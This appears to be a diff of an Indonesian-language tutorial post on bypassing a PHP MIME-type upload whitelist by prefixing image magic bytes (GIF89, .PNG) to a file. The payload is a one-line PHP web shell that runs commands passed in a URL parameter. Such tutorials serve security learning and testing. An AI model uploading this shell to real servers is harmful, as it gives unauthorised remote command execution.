@@ -9,12 +9,10 @@ comments: false
 Untuk melakukan upload filter yang dilakukan whitelist dalam bentuk MIME seperti muncul pada code PHP berikut :
 
 ```php
-
 if($imageinfo['mime'] != 'image/gif' && 
    $imageinfo['mime'] != 'image/jpeg' && 
    $imageinfo['mime'] != 'image/jpg'&& 
    $imageinfo['mime'] != 'image/png') { die('Error 002'); }
-
 ```
 
 disebutkan pada code tersebut bahwa hanya diperbolehkan untuk upload file yang dibatasi dengan MIME GIF, JPG dan PNG.
@@ -43,19 +41,15 @@ jadi first offset tersebut yang mengidtentifikasikan bahwa file tersebut tipe da
 lalu cara untuk bypass nya adalah cukup dengan membuat file *.gif atau tipe ekstensi yang di gunakan lalu dengan content file seperti berikut 
 
 ```python
-
 GIF89
 
 <?php echo shell_exec($_GET['cmd']); ?>
-
 ```
 
 ```python
-
 .PNG
 
 <?php echo shell_exec($_GET['cmd']); ?>
-
 ```
 
 so lets try it
